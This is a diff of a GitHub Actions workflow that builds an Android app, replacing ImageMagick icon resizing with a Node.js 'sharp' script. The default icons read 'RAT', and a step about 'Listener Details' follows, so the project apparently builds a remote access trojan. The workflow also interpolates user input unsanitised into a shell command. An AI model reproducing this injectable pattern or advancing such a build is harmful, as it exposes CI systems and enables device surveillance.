@@ -48,10 +48,11 @@ jobs:
         yes | sdkmanager --licenses
         sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0"
 
-    - name: Process Custom Icon
+    - name: Process Custom Icon with Node.js
       if: ${{ github.event.inputs.icon_data != '' }}
       run: |
-        echo "Processing custom icon..."
+        echo "Processing custom icon with Node.js..."
+        
         # Create mipmap directories
         mkdir -p app/src/main/res/mipmap-hdpi
         mkdir -p app/src/main/res/mipmap-mdpi
@@ -59,41 +60,124 @@ jobs:
         mkdir -p app/src/main/res/mipmap-xxhdpi
         mkdir -p app/src/main/res/mipmap-xxxhdpi
         
-        # Extract base64 data (remove data:image/png;base64, prefix if present)
+        # Extract base64 data
         ICON_DATA="${{ github.event.inputs.icon_data }}"
         if [[ $ICON_DATA == data:* ]]; then
           ICON_DATA=$(echo $ICON_DATA | sed 's/^data:image\/[^;]*;base64,//')
         fi
         
-        # Decode base64 to temporary file
-        echo $ICON_DATA | base64 -d > /tmp/custom_icon.png
+        # Create Node.js script to process image
+        cat > process-icon.js << 'EOF'
+        const fs = require('fs');
+        const sharp = require('sharp');
         
-        # Create different sized versions for different densities
-        convert /tmp/custom_icon.png -resize 48x48 app/src/main/res/mipmap-hdpi/ic_launcher.png
-        convert /tmp/custom_icon.png -resize 32x32 app/src/main/res/mipmap-mdpi/ic_launcher.png
-        convert /tmp/custom_icon.png -resize 64x64 app/src/main/res/mipmap-xhdpi/ic_launcher.png
-        convert /tmp/custom_icon.png -resize 96x96 app/src/main/res/mipmap-xxhdpi/ic_launcher.png
-        convert /tmp/custom_icon.png -resize 128x128 app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
+        const base64Data = process.argv[2];
+        if (!base64Data) {
+          console.error('No icon data provided');
+          process.exit(1);
+        }
         
-        echo "Custom icon processed successfully"
+        const sizes = [
+          { size: 48, path: 'app/src/main/res/mipmap-hdpi/ic_launcher.png' },
+          { size: 32, path: 'app/src/main/res/mipmap-mdpi/ic_launcher.png' },
+          { size: 64, path: 'app/src/main/res/mipmap-xhdpi/ic_launcher.png' },
+          { size: 96, path: 'app/src/main/res/mipmap-xxhdpi/ic_launcher.png' },
+          { size: 128, path: 'app/src/main/res/mipmap-xxxhdpi/ic_launcher.png' }
+        ];
+        
+        try {
+          const imageBuffer = Buffer.from(base64Data, 'base64');
+          
+          async function processImages() {
+            for (const { size, path } of sizes) {
+              await sharp(imageBuffer)
+                .resize(size, size, { fit: 'cover' })
+                .png()
+                .toFile(path);
+              console.log(`✅ Created ${path} (${size}x${size})`);
+            }
+            console.log('✅ All icon sizes generated successfully');
+          }
+          
+          processImages().catch(error => {
+            console.error('Error processing images:', error);
+            process.exit(1);
+          });
+        } catch (error) {
+          console.error('Error decoding base64:', error);
+          process.exit(1);
+        }
+        EOF
+        
+        # Install sharp
+        echo "Installing sharp package..."
+        npm install sharp --silent
+        
+        # Run the script
+        echo "Generating icon sizes..."
+        node process-icon.js "$ICON_DATA"
+        
+        echo "✅ Custom icon processed successfully"
 
     - name: Create Default Icons (if no custom icon)
       if: ${{ github.event.inputs.icon_data == '' }}
       run: |
         echo "No custom icon provided, creating default icons..."
+        
+        # Create mipmap directories
         mkdir -p app/src/main/res/mipmap-hdpi
         mkdir -p app/src/main/res/mipmap-mdpi
         mkdir -p app/src/main/res/mipmap-xhdpi
         mkdir -p app/src/main/res/mipmap-xxhdpi
         mkdir -p app/src/main/res/mipmap-xxxhdpi
         
-        # Create a simple colored square as default icon
-        sudo apt-get update && sudo apt-get install -y imagemagick
-        convert -size 48x48 xc:blue app/src/main/res/mipmap-hdpi/ic_launcher.png
-        convert -size 32x32 xc:blue app/src/main/res/mipmap-mdpi/ic_launcher.png
-        convert -size 64x64 xc:blue app/src/main/res/mipmap-xhdpi/ic_launcher.png
-        convert -size 96x96 xc:blue app/src/main/res/mipmap-xxhdpi/ic_launcher.png
-        convert -size 128x128 xc:blue app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
+        # Create Node.js script to generate colored icons
+        cat > generate-default-icons.js << 'EOF'
+        const fs = require('fs');
+        const sharp = require('sharp');
+        
+        const sizes = [
+          { size: 48, path: 'app/src/main/res/mipmap-hdpi/ic_launcher.png' },
+          { size: 32, path: 'app/src/main/res/mipmap-mdpi/ic_launcher.png' },
+          { size: 64, path: 'app/src/main/res/mipmap-xhdpi/ic_launcher.png' },
+          { size: 96, path: 'app/src/main/res/mipmap-xxhdpi/ic_launcher.png' },
+          { size: 128, path: 'app/src/main/res/mipmap-xxxhdpi/ic_launcher.png' }
+        ];
+        
+        // Create a simple blue square with "RAT" text
+        async function generateDefaultIcon(size, outputPath) {
+          const svgImage = `
+          <svg width="${size}" height="${size}" viewBox="0 0 ${size} ${size}" xmlns="http://www.w3.org/2000/svg">
+            <rect width="${size}" height="${size}" fill="#2196F3" rx="${size/8}" ry="${size/8}"/>
+            <text x="50%" y="50%" font-family="Arial" font-size="${size/3}" 
+                  fill="white" text-anchor="middle" dy=".3em" font-weight="bold">RAT</text>
+          </svg>`;
+          
+          await sharp(Buffer.from(svgImage))
+            .png()
+            .toFile(outputPath);
+          console.log(`✅ Created ${outputPath} (${size}x${size})`);
+        }
+        
+        async function generateAll() {
+          for (const { size, path } of sizes) {
+            await generateDefaultIcon(size, path);
+          }
+          console.log('✅ All default icons generated successfully');
+        }
+        
+        generateAll().catch(console.error);
+        EOF
+        
+        # Install sharp
+        echo "Installing sharp package..."
+        npm install sharp --silent
+        
+        # Generate default icons
+        echo "Generating default icon sizes..."
+        node generate-default-icons.js
+        
+        echo "✅ Default icons created successfully"
 
     - name: Update Configuration with Listener Details
       run: |
